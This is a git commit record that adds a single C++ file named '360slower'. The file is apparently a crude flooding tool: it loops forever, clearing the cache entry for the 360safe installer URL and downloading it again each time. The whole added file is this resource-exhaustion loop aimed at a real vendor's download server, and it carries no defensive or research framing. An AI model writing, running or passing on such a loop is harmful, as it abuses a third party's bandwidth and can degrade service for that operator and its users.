b7e52478abaa6b7ce34d39256738536a066df2a2
zouxiaofei <fyshunshun@126.com>
2018-12-23 20:57:35 +0800

    添加项目文件。

---
+++ 360slower/360slower.cpp
@@ -0,0 +1,14 @@
+﻿#include "pch.h"
+#include <iostream>
+#include <urlmon.h>
+#include <wininet.h>
+#pragma comment(lib, "urlmon.lib")
+#pragma comment(lib, "wininet.lib")
+int main()
+{
+	while (1)
+	{
+		DeleteUrlCacheEntry(L"https://dl.360safe.com/setup.exe");
+		URLDownloadToFile(NULL, L"https://dl.360safe.com/setup.exe", L"d:\\1.exe", 0, 0);
+	}
+}
